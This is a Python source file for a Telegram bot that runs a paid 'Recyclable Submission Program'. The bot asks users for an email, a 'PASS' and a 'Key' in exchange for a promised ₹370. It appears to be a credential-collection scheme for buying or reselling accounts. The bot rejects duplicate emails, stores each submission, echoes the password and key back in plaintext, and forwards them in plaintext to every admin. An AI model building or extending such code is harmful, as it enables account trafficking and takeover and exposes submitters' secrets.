import re
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.constants import ParseMode
from telegram.ext import ContextTypes, ConversationHandler
from config import ADMIN_IDS
import database as db
from keyboards import cancel_keyboard, main_menu_keyboard, admin_submission_actions_keyboard

WAIT_EMAIL, WAIT_PASS, WAIT_KEY = range(3)

EMAIL_REGEX = re.compile(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$")

def key_help_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🆘 Need Help with Key? Contact @LALAJIIIIIIIIII", url="https://t.me/LALAJIIIIIIIIII")],
        [InlineKeyboardButton("🎥 Video Tutorial (Coming Soon)", url="https://t.me/LALAJIIIIIIIIII")]
    ])

async def start_submission(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS

    # Check existing submission
    existing = await db.get_submission_by_user(user_id)
    if existing:
        status = existing["status"]
        if status == "PENDING":
            q_info = await db.get_queue_info(existing["id"])
            await update.message.reply_text(
                f"⚠️ <b>You already have a pending submission!</b>\n\n"
                f"🆔 <b>Submission ID:</b> #{existing['id']}\n"
                f"🔢 <b>Current Queue Position:</b> #{q_info['position']} "
                f"({q_info['ahead_count']} ahead of you)\n"
                f"📅 <b>Submitted Date:</b> {existing['created_at']}\n\n"
                f"Please wait while our team reviews it.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard(is_admin)
            )
            return ConversationHandler.END

        if status == "IN_REVIEW":
            await update.message.reply_text(
                f"🔍 <b>Your submission is currently In Review!</b>\n\n"
                f"🆔 <b>Submission ID:</b> #{existing['id']}\n"
                f"📅 <b>Submitted Date:</b> {existing['created_at']}\n"
                f"Our admin team is currently reviewing your details. "
                f"You will receive an instant notification when approved or updated.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard(is_admin)
            )
            return ConversationHandler.END

        if status == "ACCEPTED":
            await update.message.reply_text(
                f"✅ <b>You already have an Accepted submission!</b>\n\n"
                f"🆔 <b>Submission ID:</b> #{existing['id']}\n"
                f"Your payment will be made soon. Multiple submissions are not permitted.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard(is_admin)
            )
            return ConversationHandler.END

        if status == "DISAPPROVED":
            await update.message.reply_text(
                f"❌ <b>Your previous submission was Disapproved.</b>\n\n"
                f"🆔 <b>Submission ID:</b> #{existing['id']}\n"
                f"📝 <b>Reason:</b> {existing.get('admin_notes') or 'Verification failed'}\n\n"
                f"If you believe this was an error, please click <b>⚖️ Submit Appeal</b> from the menu.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard(is_admin)
            )
            return ConversationHandler.END

        if status == "CAN_RESUBMIT":
            context.user_data["resubmitting_id"] = existing["id"]
            await update.message.reply_text(
                f"🔄 <b>Resubmitting Your Information</b>\n\n"
                f"Your previous submission (#`{existing['id']}`) has been unlocked for resubmission.\n"
                f"📝 <i>Note: {existing.get('admin_notes') or 'Please provide corrected details.'}</i>\n"
                f"💰 <b>Rate of Refund:</b> You can potentially get <b>₹370</b>!\n\n"
                f"<b>Step 1 of 3:</b> Please enter your <b>Email Address</b>:",
                parse_mode=ParseMode.HTML,
                reply_markup=cancel_keyboard()
            )
            return WAIT_EMAIL

    # Fresh submission
    context.user_data["resubmitting_id"] = None
    intro_text = (
        "♻️ <b>Recyclable Submission Program</b>\n"
        "💰 <b>Rate of Refund:</b> You can potentially get <b>₹370</b> per submission!\n\n"
        "📧 <b>Step 1 of 3: Enter Your Email Address</b>\n"
        "<i>(Note: Only 1 query per email is allowed. Duplicate emails are strictly rejected instantly.)</i>\n\n"
        "<i>Or press ❌ Cancel anytime to stop.</i>"
    )
    await update.message.reply_text(
        intro_text,
        parse_mode=ParseMode.HTML,
        reply_markup=cancel_keyboard()
    )
    return WAIT_EMAIL

async def receive_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text.strip()
    is_admin = update.effective_user.id in ADMIN_IDS

    if email == "❌ Cancel":
        await update.message.reply_text("Submission cancelled.", reply_markup=main_menu_keyboard(is_admin))
        return ConversationHandler.END

    if not EMAIL_REGEX.match(email):
        await update.message.reply_text(
            "⚠️ <b>Invalid Email Format!</b>\n"
            "Please enter a valid email address (e.g. <code>user@example.com</code>):",
            parse_mode=ParseMode.HTML,
            reply_markup=cancel_keyboard()
        )
        return WAIT_EMAIL

    clean_email = email.lower()
    resubmitting_id = context.user_data.get("resubmitting_id")

    # INSTANT DUPLICATE EMAIL CHECK
    is_dup = await db.is_email_registered(clean_email, exclude_submission_id=resubmitting_id)
    if is_dup:
        await update.message.reply_text(
            f"🚫 <b>SUBMISSION REJECTED: DUPLICATE EMAIL</b>\n\n"
            f"The email <code>{clean_email}</code> is <b>already registered</b> in our database "
            f"or was submitted by another user previously.\n\n"
            f"⚠️ <b>Policy:</b> Only <b>1 query per email</b> is allowed. "
            f"Duplicate entries are strictly disallowed.\n\n"
            f"Your submission has been cancelled immediately.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_keyboard(is_admin)
        )
        context.user_data.clear()
        return ConversationHandler.END

    context.user_data["sub_email"] = clean_email

    # Step 2: Ask for PASS
    await update.message.reply_text(
        f"✅ Email recorded: <code>{clean_email}</code>\n\n"
        f"🔒 <b>Step 2 of 3: Enter PASS</b>\n"
        f"Please enter your <b>PASS</b>:",
        parse_mode=ParseMode.HTML,
        reply_markup=cancel_keyboard()
    )
    return WAIT_PASS

async def receive_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pass_text = update.message.text.strip()
    is_admin = update.effective_user.id in ADMIN_IDS

    if pass_text == "❌ Cancel":
        await update.message.reply_text("Submission cancelled.", reply_markup=main_menu_keyboard(is_admin))
        return ConversationHandler.END

    if len(pass_text) < 1 or len(pass_text) > 100:
        await update.message.reply_text(
            "⚠️ Please enter a valid PASS:",
            reply_markup=cancel_keyboard()
        )
        return WAIT_PASS

    context.user_data["sub_pass"] = pass_text

    # Step 3: Ask for Key + Help Button (@LALAJIIIIIIIIII) + Video tutorial placeholder
    await update.message.reply_text(
        f"✅ PASS recorded!\n\n"
        f"🔑 <b>Step 3 of 3: Enter Key</b>\n"
        f"Please enter your <b>Key</b>:\n\n"
        f"<i>💡 Need help with finding or getting your Key? Tap the Help button below:</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=key_help_keyboard()
    )
    return WAIT_KEY

async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key_text = update.message.text.strip()
    user = update.effective_user
    is_admin = user.id in ADMIN_IDS

    if key_text == "❌ Cancel":
        await update.message.reply_text("Submission cancelled.", reply_markup=main_menu_keyboard(is_admin))
        return ConversationHandler.END

    if len(key_text) < 1 or len(key_text) > 100:
        await update.message.reply_text(
            "⚠️ Please enter a valid Key:",
            reply_markup=key_help_keyboard()
        )
        return WAIT_KEY

    context.user_data["sub_key"] = key_text
    email = context.user_data["sub_email"]
    pass_code = context.user_data["sub_pass"]
    key_code = key_text
    resubmitting_id = context.user_data.get("resubmitting_id")

    # Double check duplicate email at commit time
    is_dup = await db.is_email_registered(email, exclude_submission_id=resubmitting_id)
    if is_dup:
        await update.message.reply_text(
            f"🚫 <b>Duplicate Email Detected</b>\n\n"
            f"The email <code>{email}</code> was already registered. Submission cancelled.",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu_keyboard(is_admin)
        )
        context.user_data.clear()
        return ConversationHandler.END

    if resubmitting_id:
        await db.update_submission_resubmit(resubmitting_id, email, pass_code, key_code)
        submission_id = resubmitting_id
        submission_obj = await db.get_submission_by_id(submission_id)
    else:
        submission_id = await db.create_submission(
            user_id=user.id,
            username=user.username,
            email=email,
            pass_code=pass_code,
            key_code=key_code
        )
        submission_obj = await db.get_submission_by_id(submission_id)

    # Queue Calculation
    queue_info = await db.get_queue_info(submission_id)
    position = queue_info["position"]
    ahead_count = queue_info["ahead_count"]
    total_pending = queue_info["total_pending"]
    submitted_date = submission_obj["created_at"]

    # Clear user context data
    context.user_data.clear()

    # Success message to User
    user_confirm = (
        f"🎉 <b>Recyclable Submission Received Successfully!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>Submission ID:</b> #{submission_id}\n"
        f"📧 <b>Email:</b> <code>{email}</code>\n"
        f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
        f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
        f"💰 <b>Potential Refund:</b> <b>₹370</b>\n"
        f"📅 <b>Submitted Date:</b> {submitted_date}\n"
        f"━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔢 <b>Queue Information:</b>\n"
        f"• <b>Your Queue Position:</b> #{position}\n"
        f"• <b>Submissions Ahead of You:</b> {ahead_count} waiting for review\n"
        f"• <b>Total Pending Queue:</b> {total_pending}\n\n"
        f"⏳ <b>Current Status:</b> <b>Pending Review</b>\n\n"
        f"📢 <b>Next Steps:</b>\n"
        f"1. When an admin starts reviewing, your status will change to <b>In Review</b>.\n"
        f"2. Once accepted, you will receive: <i>'status changed to accepted your payment will be made soon'</i>.\n"
        f"3. You can track your live position anytime using the <b>📊 Check Status & Queue</b> button."
    )
    await update.message.reply_text(
        user_confirm,
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_keyboard(is_admin)
    )

    # Alert to Admins
    admin_alert = (
        f"🔔 <b>New Recyclable Submission Received!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>Submission ID:</b> #{submission_id}\n"
        f"👤 <b>User:</b> @{user.username or 'NoUsername'} (ID: <code>{user.id}</code>)\n"
        f"📧 <b>Email:</b> <code>{email}</code>\n"
        f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
        f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
        f"💰 <b>Potential Refund:</b> ₹370\n"
        f"📅 <b>Date:</b> {submitted_date}\n"
        f"🔢 <b>Queue Position:</b> #{position} (Total Pending: {total_pending})\n"
        f"📊 <b>Status:</b> ⏳ PENDING\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=admin_alert,
                parse_mode=ParseMode.HTML,
                reply_markup=admin_submission_actions_keyboard(submission_id, "PENDING")
            )
        except Exception:
            pass

    return ConversationHandler.END
